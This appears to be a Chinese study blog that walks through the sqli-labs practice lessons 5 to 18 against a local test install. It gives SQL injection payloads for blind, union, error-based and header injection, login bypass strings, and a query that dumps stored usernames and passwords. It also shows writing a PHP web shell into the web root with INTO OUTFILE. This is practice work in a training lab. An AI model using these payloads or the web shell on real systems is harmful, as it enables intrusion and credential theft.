<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1&#39;">http://127.0.0.1/sqli/Less-5/?id=1&#39;</a><br>and<br> ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt; 10<br> 99<br> –+ </p>
<p>Less-6：GET-Double Injection -Double Quotes -String</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">完整注入流程：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1” and  ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;100--+ 通过二分法猜解得到所有的库,红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1”and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 1,1),1,1))&gt;1--+  再次通过二分法可猜解得到security下的所有表。其中，红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1” and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1),1,1)) &gt;1 --+  通过二分法可猜解users内的字段，其中红色为可变参数。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1”and ascii(substr((select username from security.users limit 1,1),1,1))&gt;1--+继续猜解即可得到字段内的值。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less7-GET-Dump-into-outile-String"><a href="#Less7-GET-Dump-into-outile-String" class="headerlink" title="Less7-GET -Dump into outile -String"></a>Less7-GET -Dump into outile -String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-7&#x2F;?id&#x3D;1‘)) order by 3--+ 查看有多少列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-7&#x2F;?id&#x3D;-1‘)) union select 1,2,’&lt;?php @eval($_POST[“crow”]);?&gt;‘ into outfile “C:\\phpstudy\\PHPTutorial\\WWW\\sqli\\Less-7\\test.php” --+ 将一句话木马写入其中</span><br><span class="line"></span><br><span class="line">使用中国菜刀访问即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#Less8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="Less8-GET - Blind - Boolian Based - Single Quotes"></a>Less8-GET - Blind - Boolian Based - Single Quotes</h2><p><code>http://www.sqli.com/Less-8/?id=1&#39; and if(ascii(substr(database(),1,1))=125,1,sleep(8)) --+</code></p>
<p><strong>法一：布尔盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ 判断此时存在注入漏洞</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ order by 3--+   当3改为4的时候，you are in….消失，说明存在三列。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and left((select database()),1)&#x3D;0x73 --+ #猜出来当前第一位是s</span><br><span class="line">或者是使用： </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select database()),1,1)) &gt; 16--+ 此时是有回显的。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) &gt;17 --+ 先通过大于号或者小于号来判断数据库的第一个字母是哪一个，</span><br><span class="line">也可以使用</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1)) &#x3D; 115--+ 此时可以验证数据库中第五个数据库的第一个字母是s</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 3,1),1,1)) &gt;11 --+ 判断security数据库中的第4个表中的数据的第一位是否大于11, </span><br><span class="line">也可以使用 </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;0x7365637572697479 limit 3,1),1,1)) &#x3D;117 --+ 验证数据库中第4个表中的数据的第一位的第一个字母的ascii码是否是117，也就是 u</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and  ascii(substr((select column_name from information_schema.columns where table_name &#x3D; 0x7573657273 limit 1,1),1,1)) &gt;10 --+ 同理，进行判断表中的字段，然后进行判断。可以得到username，password；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘  and ascii(substr((select username from security.users limit 0,1),1,1)) &gt;10 --+ 同理，进行判断，最后再使用password进行判断。</span><br><span class="line"></span><br><span class="line">因为猜解速度较慢，可以配合burpsuite或者是sqlmap的脚本来使用</span><br></pre></td></tr></table></figure>

<p><strong>法二：时间盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and sleep(5)--+ 使用延迟的方法判断是否存在注入漏洞。当然判断是否存在注入漏洞的方法很多。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and if(length(database()) &#x3D; 8,1,sleep(5))--+ 当为8的时候很快加载，而为其他值得时候加载较慢（5s左右），那就说明此时数据库的长度就是8（security）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1’ and if(ascii(substr((select database()),1,1)) &gt;113,1,sleep(5))--+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5s。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;?id&#x3D;1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;112,1,sleep(5))--+ 同理判断数据库中的第5个数据库的第一位的ascii的值是不是大于112（实际中是115），如果是的则速度返回，否则延时5s返回结果。</span><br><span class="line"></span><br><span class="line">其余步骤与法一基本类似，可以采用burpsuite或者是sql盲注脚本使用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-9：GET-Blind-Time-based-Single-Quotes"><a href="#Less-9：GET-Blind-Time-based-Single-Quotes" class="headerlink" title="Less-9：GET - Blind - Time based. - Single Quotes"></a>Less-9：GET - Blind - Time based. - Single Quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘  order by 3999--+ 当使用order by的时候，此时无论如何都是回显you are in….所以无法使用order by进行判断。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and sleep(5)--+ 当存在注入漏洞时，可以使用延迟注入进行判断，此时若存在漏洞，则睡眠5s之后再返回结果。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and if(length(database())&#x3D;8,1,sleep(5)); 通过返回时间进行判断，此时如果数据库长度为8，则可以较快返回。</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;1112,1,sleep(5))--+ 使用less-8中同样的方法进行判断即可!</span><br><span class="line"></span><br><span class="line">因为盲注属于猜解，推荐使用脚本进行操作。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-10-GET-Blind-Time-based-double-quotes"><a href="#Less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="Less-10:GET-Blind - Time based -double quotes"></a>Less-10:GET-Blind - Time based -double quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-10&#x2F;?id&#x3D;1“ and sleep(11)--+ 只是将less-9中的单引号换成了双引号，其余的均相同</span><br></pre></td></tr></table></figure>

<h2 id="Less-11-：POST-Error-Based-Single-quotes-String"><a href="#Less-11-：POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11 ：POST -Error Based - Single quotes- String"></a>Less-11 ：POST -Error Based - Single quotes- String</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于POST关卡，我们需要使用burpsuite进行配合操作</span><br><span class="line">同样在代码中加入两行：</span><br><span class="line">        <span class="keyword">echo</span> $sql;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>知识点补充</strong></p>
<p>select 1=1 and 1=2;<br>select 1=1 or 1=2;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line"></span><br><span class="line">POST内容： uname&#x3D;‘ &amp; passwd&#x3D;1&amp;submit&#x3D;Submit 返回的结果显示你存在sql语法错误，证明存在注入漏洞。或这是直接在username中填写’，password中随便写判断一下是否存在注入漏洞。</span><br><span class="line"></span><br><span class="line">直接在username中填写 admin‘ or 1&#x3D;1#（此处不能使用--+，因为--+主要使用在url中，#是适用的）即： uname&#x3D;a’ or 1&#x3D;1 #&amp; passwd&#x3D;a &amp;submit&#x3D;Submit此时登录成功，可以验证存在注入漏洞。</span><br><span class="line"></span><br><span class="line">此时在password位置进行验证：uname&#x3D;a&amp;passwd&#x3D;a‘ or 1&#x3D;1# &amp;submit&#x3D;Submit，登录成功，开始构造！</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ order by 3#&amp;passwd&#x3D;a &amp;submit&#x3D;Submit或者是使用 uname&#x3D;a&amp;passwd&#x3D;a’ order by 2# &amp;submit&#x3D;Submit同样可以进行判断，最后得出一共有两列。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a‘ union select database(),2  # &amp;submit&#x3D;Submit查询到当前的数据库为security，或者是使用：uname&#x3D;a’ union select database(),2  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit均可以查询到当前的数据库，当然也可以查询其它信息。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以查询到当前的第一个数据库，</span><br><span class="line">或者是使用命令：</span><br><span class="line">uname&#x3D;a’ union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以得到所有的数据库。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以得到security数据库中的所有的表信息</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 通过users表获得里面的列值：id,username,password</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1, group_concat(concat_ws(’~‘,username,password)) from security.users  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 此时就可以得到里面所有的数据。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Les-12：-POST-Error-Based-Double-quotes-String-with-twist"><a href="#Les-12：-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Les-12：. POST - Error Based - Double quotes- String - with twist"></a>Les-12：. POST - Error Based - Double quotes- String - with twist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line">1. 首先进行尝试： uname&#x3D;admin‘ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时只是显示登陆失败，没有其他的回显，将’换为”</span><br><span class="line">2. uname&#x3D;admin“ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时有回显，显示有报错信息，通过报错信息，我们知道如何进行构造：’)</span><br><span class="line">3. uname&#x3D;admin“) or 1&#x3D;1# &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时构造成功之后，显示登陆成功。接下来的和less-11相同。</span><br><span class="line">4. uname&#x3D;admin“) order by 3# &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  通过order by语句得到一共有两列。</span><br><span class="line">5. uname&#x3D;a&amp;passwd&#x3D;a&quot;) union select database(),2  # &amp;submit&#x3D;Submit查询到当前的数据库为security，或者是使用： uname&#x3D;a&quot;) union select database(),2  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit均可以查询到当前的数据库，当然也可以查询其它信息。</span><br><span class="line">6. uname&#x3D;a&quot;) union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以查询到当前的第一个数据库，或者是使用命令： uname&#x3D;a&quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以得到所有的数据库。</span><br><span class="line">7. uname&#x3D;a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以得到security数据库中的所有的表信息</span><br><span class="line"></span><br><span class="line">8. uname&#x3D;a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit通过users表获得里面的列值：id,username,password</span><br><span class="line">9. uname&#x3D;a“) union select 1, group_concat(concat_ws(0x7e,username,password)) from security.users  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 此时就可以得到里面所有的数据。 0x7e代表的就是  ~</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-13：POST-Double-Injection-Single-quotes-Strinq-with-twist"><a href="#Less-13：POST-Double-Injection-Single-quotes-Strinq-with-twist" class="headerlink" title="Less-13：POST- Double Injection - Single quotes- Strinq -with twist"></a>Less-13：POST- Double Injection - Single quotes- Strinq -with twist</h2><p>没有回显，我们采用盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select length(database());</span><br><span class="line">if()</span><br><span class="line">长度：if(length(database())&gt;1,1,sleep(5));  数据库字符长度是8</span><br><span class="line">left(database(),1)&#x3D;&#39;a&#39;</span><br><span class="line"></span><br><span class="line">uname&#x3D;ain&#39;) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;&#39;a&#39; #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  </span><br><span class="line">inf</span><br><span class="line">A-Z</span><br><span class="line">0_9</span><br><span class="line">_</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200522142405950.png" alt="image-20200522142405950"><img src="/2020/07/13/sqlo-labs/image-20200522142838946.png" alt="image-20200522142838946"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> uname&#x3D;admin &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  此时只是显示登陆成功，但是不会显示其他的信息。</span><br><span class="line"></span><br><span class="line">uname&#x3D;‘ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  直接通过报错信息知道了如何构造   构造：1’) or 1&#x3D;1#</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin‘) order by 2# &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  此时只是显示登陆成功，但是不会显示其他信息，考虑盲注。</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin‘) or if(length(database())&#x3D;8,1,sleep(5))# &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 此时可以得到数据库的长度是8.</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left(database(),1)&gt;’a‘#&amp;submit&#x3D;Submit 使用or和left()来判断第一个字母是多少(注意的是这里不是使用and)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left(database(),2)&#x3D;’se‘#&amp;submit&#x3D;Submit 通过这样一个个进行判断即可！</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;’a‘#&amp;submit&#x3D;Submit 或者是使用这种方法也是可以判断的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-14-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-14  POST -Double Injection- Single quotes String -with twist"></a>Less-14  POST -Double Injection- Single quotes String -with twist</h2><p> uname=admin “ or length(database())=’8’#&amp;passwd=admin&amp;submit=Submit<br> A or B<br> A and B </p>
<p>uname=ain” or left((select schema_name from information_schema.schemata limit 0,1),1)=’u’ #&amp;passwd=admin&amp;submit=Submit<br>uname=adin “ or left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1)&gt;’a’#&amp;passwd=admin&amp;submit=Submit<br>uname=adin “ or left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1)=’a’#&amp;passwd=admin&amp;submit=Submit  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入两行:  echo $sql;              echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;a“&amp;submit&#x3D;Submit   构造：&quot; or 1&#x3D;1#</span><br><span class="line">2. uname&#x3D;admin&amp;passwd&#x3D;a“ order by 10#&amp;submit&#x3D;Submit 判断一共有多少列</span><br><span class="line">3. uname&#x3D;admin&amp;passwd&#x3D;a“ or if(length(database())&#x3D;8,1,sleep(5))# #&amp;submit&#x3D;Submit 使用和less-13同样的方法进行判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#Less15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less15-POST -Blind- Boolian/time Based - Single quotes"></a>Less15-POST -Blind- Boolian/time Based - Single quotes</h2><p>没有错误显示，可以选择延时注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入两行: </span><br><span class="line">echo $sql;             </span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;a“&amp;submit&#x3D;Submit    构造：1‘ or 1&#x3D;1#   在这里判断列数没有实际意义了</span><br><span class="line">2. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand&#39; or if(length(database())&gt;1000,1,sleep(5))#&amp;submit&#x3D;Submit通过这个来判断其长度</span><br><span class="line">3. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand&#39; or if(length()&gt;1000,1,sleep(5))#&amp;submit&#x3D;Submit</span><br><span class="line">4. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select table_name from information_schema.tables where table_schema&#x3D;’security‘ limit 0,1),1)&gt;’a‘#&amp;submit&#x3D;Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select column_name from information_schema.columns where table_name&#x3D;’users‘ limit 0,1),1)&gt;’g‘#&amp;submit&#x3D;Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select username from security.users limit 0,1),1)&gt; ’a‘#&amp;submit&#x3D;Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Less-17</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line">首先在代码中加入两行:  echo $sql;              echo “&lt;&#x2F;br&gt;”;  而且要是update后也加上。</span><br><span class="line">使用了get_magic_quotes_gpc      name和password分开验证，而且在验证的时候对于name进行了过滤处理，将’进行了转义</span><br><span class="line">首先我们要知道用户的名字是多少，然后才可以进行接下来的操作</span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;adm ‘ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security‘ limit 0,1),0x7e),1)#&amp;submit&#x3D;Submit  通过查询，可以得到security库下面的其中一个表名字</span><br><span class="line">2. uname&#x3D;admin&amp;passwd&#x3D;adm ‘ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users‘ limit 0,1),0x7e),1)#&amp;submit&#x3D;Submit 同样的方法可以获得其他的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-18-POST-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18:POST-Header Injection - Uagent field - Error based"></a>Less-18:POST-Header Injection - Uagent field - Error based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容： ‘and updatexml(1,concat(0x7e,(database()),0x7e),1) and ’1‘&#x3D; ‘1注册登录再注入</span><br><span class="line">1. 登录失败显示ip地址</span><br><span class="line">2. 登录成功显示ip地址和User-Agent</span><br><span class="line">3. $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span><br><span class="line">4. 分析后得知，需要进行闭合操作，两种方法：</span><br><span class="line">（1）&#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;&#x3D;‘1</span><br><span class="line">（2）‘ or updatexml(1,concat(0x7e,(database())),1), “, ‘’)# (注意在直接复制的时候，可能出现错误)</span><br><span class="line">然后再通过mysql注入语句进行操作即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>摸索</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;Mn.0&#39;, &#39;127.0.0.1&#39;, &#39;admin&#39;)</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,()),1);</span><br><span class="line">select  updatexml(1,concat(0x7e,(database())),1);</span><br><span class="line">第一种</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(database())),1) or &#39;1&#39;&#x3D;&#39;1      # or &#39;1&#39;&#x3D;&#39;1是为了闭合&#39;Mn.0&#39;的右边的&#39;</span><br><span class="line">第二种</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(database())),1), &#39;&#39;,&#39;&#39;)#       #concat后面的&#96;&#39;&#39;,&#39;&#39;)#&#96;可以将ip_address和username闭合掉，然后#注释后面的语句</span><br><span class="line">后面的payload是根据前面的两种方法就行的构造，来获取自己想要的东西</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select username from security.users limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br></pre></td></tr></table></figure>

